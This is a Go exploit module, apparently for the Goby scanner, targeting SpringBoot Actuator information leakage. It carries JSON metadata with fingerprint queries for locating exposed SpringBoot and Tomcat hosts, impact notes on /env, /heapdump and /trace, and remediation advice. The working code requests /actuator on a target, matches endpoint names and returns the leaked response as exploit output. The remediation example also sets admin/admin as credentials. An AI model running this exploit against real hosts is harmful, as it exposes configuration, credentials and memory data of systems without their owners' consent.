package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SpringBoot actuator information leakage vulnerability",
    "Description": "<p>Actuator is a functional module provided by springboot for introspection and monitoring of application systems. With the help of Actuator, developers can easily view and collect statistics on certain monitoring indicators of the application system.</p><p>When Actuator is enabled, if relevant permissions are not controlled, illegal users can obtain monitoring information in the application system by accessing the default actuator endpoint.</p>",
    "Product": "SpringBoot",
    "Homepage": "https://spring.io/",
    "DisclosureDate": "2019-01-14",
    "PostTime": "2023-12-26",
    "Author": "xiannv",
    "FofaQuery": "body=\"<h1>Spring + Hibernate + SpringMVC/Struts basic project.</h1>\" || header=\"SpringBoot\" || banner=\"SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\") || title=\"Spring Batch Admin\" || title=\"Spring Batch Lightmin\" || header=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || banner=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || header=\"realm=\\\"Spring Security Application\" || banner=\"realm=\\\"Spring Security Application\" || header=\"Apache-Coyote\" || banner=\"Apache-Coyote\" || body=\"href=\\\"tomcat.css\" || title=\"Apache Tomcat\" || (title=\"Error report\" && title!=\"JBoss\") || body=\"This is the default Tomcat home page\" || server=\"tomcat\" || body=\"<h3>Apache Tomcat\" || banner=\"Tomcat\" || header=\"Tomcat\" || title=\"spring framework\" || header=\"JSESSIONID\" || banner=\"JSESSIONID\" || (body=\"timestamp\" && body=\"status\" && body=\"message\" && body=\"path\" && body=\"success\" && body=\"msg\" && body=\"code\")",
    "GobyQuery": "body=\"<h1>Spring + Hibernate + SpringMVC/Struts basic project.</h1>\" || header=\"SpringBoot\" || banner=\"SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\") || title=\"Spring Batch Admin\" || title=\"Spring Batch Lightmin\" || header=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || banner=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || header=\"realm=\\\"Spring Security Application\" || banner=\"realm=\\\"Spring Security Application\" || header=\"Apache-Coyote\" || banner=\"Apache-Coyote\" || body=\"href=\\\"tomcat.css\" || title=\"Apache Tomcat\" || (title=\"Error report\" && title!=\"JBoss\") || body=\"This is the default Tomcat home page\" || server=\"tomcat\" || body=\"<h3>Apache Tomcat\" || banner=\"Tomcat\" || header=\"Tomcat\" || title=\"spring framework\" || header=\"JSESSIONID\" || banner=\"JSESSIONID\" || (body=\"timestamp\" && body=\"status\" && body=\"message\" && body=\"path\" && body=\"success\" && body=\"msg\" && body=\"code\")",
    "Level": "1",
    "Impact": "<p>Actuator is a functional module provided by Springboot for introspection and monitoring of application systems. With the help of Actuator, developers can easily view and collect statistics on certain monitoring indicators of application systems.</p><p>When Actuator is enabled, if relevant permissions are not controlled, illegal users can obtain monitoring information in the application system by accessing the default actuator endpoints; user authentication field information can be obtained by accessing the /trace path; it is possible Obtain the username and password of mysql and mongodb through its /env path; accessing its /health path can detect the site's git project address, leading to source code leakage; accessing the /heapdump path will leak site memory information, which may include the account and password of the backend user wait.</p>",
    "Recommendation": "<p>1. Spring Boot disables all interfaces. For example, to disable the /env interface, you can set it as follows:</p><p>endpoints.env.enabled= false</p><p>If you only want to open one or two interfaces, disable all interfaces first, and then enable the required interfaces:</p><p>endpoints.enabled = false</p><p>endpoints.metrics.enabled = true</p><p>2. You can also introduce spring-boot-starter-security dependency</p><p>&lt;dependency&gt;</p><p>             &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</p><p>             &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;</p><p>  &lt;/dependency&gt;</p><p>Specify the port of the actuator in application.properties, enable the security function, and configure access permission verification. At this time, when accessing the actuator function, a login window will pop up, and you need to enter the account and password for verification before access is allowed.</p><p>management.port=8099</p><p>management.security.enabled=true</p><p>security.user.name=admin</p><p>security.user.password=admin</p><p>3. Configure the Actuator management port not to be open to the external network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "SpringBoot actuator 信息泄漏漏洞",
            "Product": "vmware-SpringBoot-Framework",
            "Description": "<p>Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。</p><p>在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点来获取应用系统中的监控信息。<br></p>",
            "Recommendation": "<p>1、Spring Boot禁用所有接口。比如要禁用/env接口，则可设置如下：</p><p>endpoints.env.enabled= false</p><p>如果只想打开一两个接口，那就先禁用全部接口，然后启用需要的接口：</p><p>endpoints.enabled = false</p><p>endpoints.metrics.enabled = true</p><p>2、也可以引入spring-boot-starter-security依赖</p><p>&lt;dependency&gt;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;</p><p>&nbsp;&lt;/dependency&gt;</p><p>在application.properties中指定actuator的端口以及开启security功能，配置访问权限验证，这时再访问actuator功能时就会弹出登录窗口，需要输入账号密码验证后才允许访问。</p><p>management.port=8099</p><p>management.security.enabled=true</p><p>security.user.name=admin</p><p>security.user.password=admin</p><p>3、配置Actuator管理端口不对外网开放。</p>",
            "Impact": "<p>Actuator 是 Springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。</p><p>在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息；可通过访问/trace 路径获取用户认证字段信息；可能通过其/env 路径获得 mysql、mongodb 的用户名及密码；访问其/health路径可探测到站点 git 项目地址，导致泄露源码；访问/heapdump 路径会泄露站点内存信息，可能会包含后台用户的账号密码等。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "SpringBoot actuator information leakage vulnerability",
            "Product": "SpringBoot",
            "Description": "<p>Actuator is a functional module provided by springboot for introspection and monitoring of application systems. With the help of Actuator, developers can easily view and collect statistics on certain monitoring indicators of the application system.</p><p>When Actuator is enabled, if relevant permissions are not controlled, illegal users can obtain monitoring information in the application system by accessing the default actuator endpoint.</p>",
            "Recommendation": "<p>1. Spring Boot disables all interfaces. For example, to disable the /env interface, you can set it as follows:</p><p>endpoints.env.enabled= false</p><p>If you only want to open one or two interfaces, disable all interfaces first, and then enable the required interfaces:</p><p>endpoints.enabled = false</p><p>endpoints.metrics.enabled = true</p><p>2. You can also introduce spring-boot-starter-security dependency</p><p>&lt;dependency&gt;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;</p><p>&nbsp; &lt;/dependency&gt;</p><p>Specify the port of the actuator in application.properties, enable the security function, and configure access permission verification. At this time, when accessing the actuator function, a login window will pop up, and you need to enter the account and password for verification before access is allowed.</p><p>management.port=8099</p><p>management.security.enabled=true</p><p>security.user.name=admin</p><p>security.user.password=admin</p><p>3. Configure the Actuator management port not to be open to the external network.</p>",
            "Impact": "<p>Actuator is a functional module provided by Springboot for introspection and monitoring of application systems. With the help of Actuator, developers can easily view and collect statistics on certain monitoring indicators of application systems.</p><p>When Actuator is enabled, if relevant permissions are not controlled, illegal users can obtain monitoring information in the application system by accessing the default actuator endpoints; user authentication field information can be obtained by accessing the /trace path; it is possible Obtain the username and password of mysql and mongodb through its /env path; accessing its /health path can detect the site's git project address, leading to source code leakage; accessing the /heapdump path will leak site memory information, which may include the account and password of the backend user wait.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10902"
}`
	sendPayload37dbYRFbdyG30hfuidb := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewGetRequestConfig("/actuator")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = true
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayload37dbYRFbdyG30hfuidb(hostInfo)
			if resp != nil && resp.StatusCode == 200 && strings.HasPrefix(resp.RawBody, `{`) && strings.HasSuffix(resp.RawBody, `}`) && (strings.Contains(resp.RawBody, `"_links":`) || strings.Contains(resp.RawBody, `"self":`) || strings.Contains(resp.RawBody, `"auditevents":`) || strings.Contains(resp.RawBody, `"beans":`) || strings.Contains(resp.RawBody, `"health":`) || strings.Contains(resp.RawBody, `"conditions":`) || strings.Contains(resp.RawBody, `"configprops":`) || strings.Contains(resp.RawBody, `"env":`) || strings.Contains(resp.RawBody, `"env-toMatch":`) || strings.Contains(resp.RawBody, `"info":`) || strings.Contains(resp.RawBody, `"loggers-name":`) || strings.Contains(resp.RawBody, `"loggers":`) || strings.Contains(resp.RawBody, `"heapdump":`) || strings.Contains(resp.RawBody, `"threaddump":`) || strings.Contains(resp.RawBody, `"prometheus":`) || strings.Contains(resp.RawBody, `"metrics":`) || strings.Contains(resp.RawBody, `"metrics-requiredMetricName":`) || strings.Contains(resp.RawBody, `"scheduledtasks":`) || strings.Contains(resp.RawBody, `"httptrace":`) || strings.Contains(resp.RawBody, `"mappings":`)) {
				ss.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if resp, err := sendPayload37dbYRFbdyG30hfuidb(expResult.HostInfo); resp != nil && resp.StatusCode == 200 && strings.HasPrefix(resp.RawBody, `{`) && strings.HasSuffix(resp.RawBody, `}`) && (strings.Contains(resp.RawBody, `"_links":`) || strings.Contains(resp.RawBody, `"self":`) || strings.Contains(resp.RawBody, `"auditevents":`) || strings.Contains(resp.RawBody, `"beans":`) || strings.Contains(resp.RawBody, `"health":`) || strings.Contains(resp.RawBody, `"conditions":`) || strings.Contains(resp.RawBody, `"configprops":`) || strings.Contains(resp.RawBody, `"env":`) || strings.Contains(resp.RawBody, `"env-toMatch":`) || strings.Contains(resp.RawBody, `"info":`) || strings.Contains(resp.RawBody, `"loggers-name":`) || strings.Contains(resp.RawBody, `"loggers":`) || strings.Contains(resp.RawBody, `"heapdump":`) || strings.Contains(resp.RawBody, `"threaddump":`) || strings.Contains(resp.RawBody, `"prometheus":`) || strings.Contains(resp.RawBody, `"metrics":`) || strings.Contains(resp.RawBody, `"metrics-requiredMetricName":`) || strings.Contains(resp.RawBody, `"scheduledtasks":`) || strings.Contains(resp.RawBody, `"httptrace":`) || strings.Contains(resp.RawBody, `"mappings":`)) {
				expResult.Output = resp.RawBody
				expResult.Success = true
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
